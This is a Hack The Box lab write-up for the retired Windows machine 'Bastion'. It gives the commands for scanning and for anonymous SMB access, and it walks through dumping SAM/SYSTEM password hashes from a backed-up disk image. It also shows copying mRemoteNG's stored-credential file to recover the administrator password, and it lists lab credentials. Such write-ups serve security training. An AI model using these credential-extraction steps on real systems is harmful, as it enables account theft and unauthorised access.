---
layout: writeup
name: "Bastion"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/bastion/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---
# 🧪 Bastion – Hack The Box

**Platform:** Hack The Box  
**Difficulty:** Easy  
**IP Address:** 10.10.10.134  
**Date Completed:** [Insert Date]  

---

## 🧭 Overview

Bastion is an Easy-rated Windows machine that contains a Virtual Hard Disk (VHD) file shared via SMB. By mounting and inspecting this disk, user hashes can be extracted from the SAM and SYSTEM files. Once cracked, valid user credentials provide SSH access to the system. Privilege escalation is then achieved by exploiting mRemoteNG’s insecure password storage, allowing retrieval of administrator credentials.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- --min-rate=1000 -T4 10.10.10.134
nmap -p22,135,139,445 -sC -sV -T4 10.10.10.134
```

### 📁 SMB Share

```bash
smbclient -N -L //10.10.10.134
smbclient -N //10.10.10.134/Backups
```

Discovered a VHD file within the `Backups` share.

---

## 🪜 Foothold

- Mount or extract the VHD file using 7-Zip
- Navigate to: `Windows/System32/config`
- Extract `SAM` and `SYSTEM` hives
- Crack NTLM hash using `samdump2` and online services

```bash
samdump2 SYSTEM SAM > hashes.txt
```

- Cracked credentials:  
  `l4mpje : bureaulampje`

### 🔑 SSH Access

```bash
ssh l4mpje@10.10.10.134
# password: bureaulampje
```

📄 `user.txt`  
`681cf1f0************************`

---

## ⚙️ Privilege Escalation

- Enumerated installed software: `mRemoteNG`
- Version: 1.76.11 (vulnerable)
- Locate config:  
  `C:\Users\l4mpje\AppData\Roaming\mRemoteNG\confCons.xml`

- Download config:
```bash
scp l4mpje@10.10.10.134:/users/l4mpje/AppData/Roaming/mRemoteNG/confCons.xml .
```

- Import into mRemoteNG on attacker machine
- Create external tool to echo password:
```cmd
cmd /k echo "password %password%"
```

- Retrieved password:  
  `thXLHM96BeKL0ER2`

### 🧑‍💼 Administrator Access

```bash
ssh Administrator@10.10.10.134
# password: thXLHM96BeKL0ER2
```

📄 `root.txt`  
`5feb8575************************`

---

## 🧠 Lessons Learned

- VHD files shared over SMB may contain sensitive disk backups
- SAM and SYSTEM hives are valuable targets for local password hashes
- Legacy apps like mRemoteNG often store credentials insecurely
- Always enumerate installed software for weak config or credential leaks

---

## 📸 Proof

![bastion.png](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/bastion.png)